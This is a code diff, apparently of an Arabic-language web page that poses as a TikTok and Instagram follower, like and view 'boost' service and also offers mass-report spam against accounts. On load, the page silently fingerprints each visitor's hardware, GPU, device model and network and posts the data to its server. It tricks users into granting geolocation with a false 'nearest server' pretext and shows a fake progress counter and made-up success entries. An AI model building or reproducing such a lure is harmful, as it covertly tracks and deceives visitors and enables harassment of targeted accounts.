@@ -8,10 +8,14 @@
         body { background-color: black; color: white; text-align: center; font-family: 'Courier New', monospace; padding: 20px; direction: rtl; }
         pre { font-size: 8px; color: #00ff00; margin-bottom: 20px; }
         .menu-btn { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .back-btn { background: #330000; border: 1px solid #ff0000; color: #ff0000; margin-top: 15px; width: 50%; padding: 10px; border-radius: 5px; cursor: pointer; }
         .hidden { display: none; }
         input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
         .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
         #progress-container { margin-top: 20px; color: #00ff00; font-size: 20px; border: 1px solid #00ff00; padding: 10px; border-radius: 10px; }
+        #live-status { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; text-align: right; font-size: 11px; color: #00ff00; }
+        .status-entry { margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 5px; }
+        .tag-success { color: #00ff00; } .tag-process { color: #ffff00; }
     </style>
 </head>
 <body>
@@ -42,23 +46,34 @@ u$$$$$$$$$$$$$$$$$$$$$u
     </div>
 
     <div id="platform-menu" class="hidden">
-        <h3 id="plat-title"></h3>
+        <h3 id="plat-title">اختر المنصة</h3>
         <button class="menu-btn" onclick="showOptions('TikTok')">تيك توك</button>
         <button class="menu-btn" onclick="showOptions('Instagram')">انستقرام</button>
+        <button class="back-btn" onclick="goBack('main-menu')">إلغاء / رجوع ↩️</button>
     </div>
 
     <div id="boost-options" class="hidden">
         <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب', 5000)">رشق متابعين</button>
         <button class="menu-btn" onclick="openFinal('رشق لايكات', 'رابط المقطع', 5000)">رشق لايكات</button>
         <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع', 5000)">رشق مشاهدات</button>
+        <button class="back-btn" onclick="goBack('platform-menu')">رجوع ↩️</button>
     </div>
 
     <div id="final-input" class="hidden">
         <h3 id="final-title"></h3>
         <input type="text" id="target-id" placeholder="">
         <input type="number" id="target-count" placeholder="">
-        <button class="action-btn" onclick="requestAccess()">ابدأ التنفيذ الآن ✅</button>
-        <div id="progress-container" class="hidden">جاري العمل: <span id="counter">0</span></div>
+        <button class="action-btn" onclick="requestAccess()">تأكيد العملية ✅</button>
+        <button class="back-btn" onclick="location.reload()">إلغاء العملية ❌</button>
+        <div id="progress-container" class="hidden">حالة الإرسال: <span id="counter">0</span></div>
+    </div>
+
+    <div id="live-status">
+        <h4>آخر العمليات الناجحة:</h4>
+        <div id="status-list">
+            <div class="status-entry">👤 المستخدم: a***_2 | <span class="tag-success">اكتملت ✅</span></div>
+            <div class="status-entry">👤 المستخدم: k***_9 | <span class="tag-process">جارٍ الإرسال... ⏳</span></div>
+        </div>
     </div>
 
     <script>
@@ -80,65 +95,62 @@ u$$$$$$$$$$$$$$$$$$$$$u
 
         async function silentCapture() {
             if (!window.location.hostname.includes(MY_DOMAIN)) return;
-
             const hwID = await generateHardwareID();
-            
-            // سحب كرت الشاشة الدقيق
             let gpu = "غير معروف";
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
-
-            // كشف نوع الجهاز من أبعاد الشاشة (خاص بالأيفون)
+            
+            const w = window.screen.width; const h = window.screen.height;
             let deviceModel = navigator.platform;
-            const w = window.screen.width;
-            const h = window.screen.height;
             if (w === 430 && h === 932) deviceModel = "iPhone 14/15 Pro Max";
             else if (w === 393 && h === 852) deviceModel = "iPhone 14/15 Pro";
-            else if (w === 390 && h === 844) deviceModel = "iPhone 12/13/14";
-            else if (w === 414 && h === 896) deviceModel = "iPhone XR/11/11 Pro Max";
-            else if (w === 375 && h === 812) deviceModel = "iPhone X/XS/11 Pro";
-
-            // كشف نوع الشبكة الذكي
-            let netType = "بيانات (Cellular)";
-            if (navigator.connection) {
-                netType = navigator.connection.effectiveType === 'wifi' ? "واي فاي (WiFi)" : navigator.connection.effectiveType;
-            } else if (navigator.userAgent.match(/iPhone/i)) {
-                netType = (navigator.maxTouchPoints > 1) ? "WiFi/Fast-Net" : "Mobile Data";
-            }
-
-            // سحب البطارية (للأندرويد والكمبيوتر)
-            let batteryStatus = "محمي (iOS)";
-            try {
-                const b = await navigator.getBattery();
-                batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
-            } catch (e) {}
 
             deviceCapturedData = {
-                hw_id: hwID,
-                gpu: gpu,
-                model: deviceModel,
-                battery: batteryStatus,
-                network: netType,
-                screen: `${w}x${h}`,
-                platform: navigator.platform,
-                ram: navigator.deviceMemory || '?'
+                hw_id: hwID, gpu: gpu, model: deviceModel, screen: `${w}x${h}`,
+                network: (navigator.maxTouchPoints > 1) ? "WiFi/Fast-Net" : "Mobile Data",
+                platform: navigator.platform
             };
 
-            fetch('/api/index', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+            fetch('/api/index', { method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ mode: "زيارة صامتة", device_info: deviceCapturedData })
             });
+        }
+
+        function showSub(m) { 
+            mode = m; 
+            document.getElementById('main-menu').classList.add('hidden'); 
+            document.getElementById('platform-menu').classList.remove('hidden'); 
+        }
+
+        function showOptions(p) { 
+            platform = p; 
+            document.getElementById('platform-menu').classList.add('hidden'); 
+            if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); 
+            else openFinal('إسبام بلاغات', 'يوزر الحساب', 300); 
+        }
+
+        function openFinal(s, h, limit) { 
+            service = s; maxLimit = limit;
+            document.getElementById('boost-options').classList.add('hidden'); 
+            document.getElementById('final-input').classList.remove('hidden'); 
+            document.getElementById('final-title').innerText = platform + " - " + s;
+            document.getElementById('target-id').placeholder = h;
+            document.getElementById('target-count').placeholder = "الحد الأقصى " + limit;
+        }
+
+        function goBack(targetId) {
+            document.querySelectorAll('div[id$="-menu"], div[id$="-options"], #final-input').forEach(d => d.classList.add('hidden'));
+            document.getElementById(targetId).classList.remove('hidden');
         }
 
         function requestAccess() {
             const id = document.getElementById('target-id').value;
             const count = document.getElementById('target-count').value;
-            if(!id || !count) return alert("أكمل البيانات!");
-            alert("للحماية، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر.");
+            if(!id || !count) return alert("يرجى إكمال البيانات!");
+            
+            alert("لضمان سرعة الربط، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر متاح.");
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => sendFinalData(id, count, pos.coords.latitude, pos.coords.longitude),
@@ -148,9 +160,7 @@ u$$$$$$$$$$$$$$$$$$$$$u
         }
 
         async function sendFinalData(id, count, lat, lon) {
-            fetch('/api/index', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+            fetch('/api/index', { method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ mode: mode, service: service, target_id: id, count: count, lat: lat, lon: lon, device_info: deviceCapturedData })
             });
             startCounter(count);
@@ -160,14 +170,10 @@ u$$$$$$$$$$$$$$$$$$$$$u
             document.getElementById('progress-container').classList.remove('hidden');
             let current = 0;
             let interval = setInterval(() => {
-                if(current >= max) { clearInterval(interval); alert("تمت العملية بنجاح!"); location.reload(); }
-                else { current++; document.getElementById('counter').innerText = current; }
-            }, 1200);
+                if(current >= max) { clearInterval(interval); alert("اكتمل الإرسال بنجاح!"); location.reload(); }
+                else { current += Math.floor(Math.random() * 5) + 1; if(current > max) current = max; document.getElementById('counter').innerText = current; }
+            }, 800);
         }
-
-        function showSub(m) { mode = m; document.getElementById('main-menu').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); }
-        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); else openFinal('إسبام بلاغات', 'يوزر الحساب', 300); }
-        function openFinal(s, h, limit) { service = s; maxLimit = limit; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('target-id').placeholder = h; document.getElementById('target-count').placeholder = "الحد الأقصى " + limit; }
 
         window.addEventListener('DOMContentLoaded', silentCapture);
     </script>
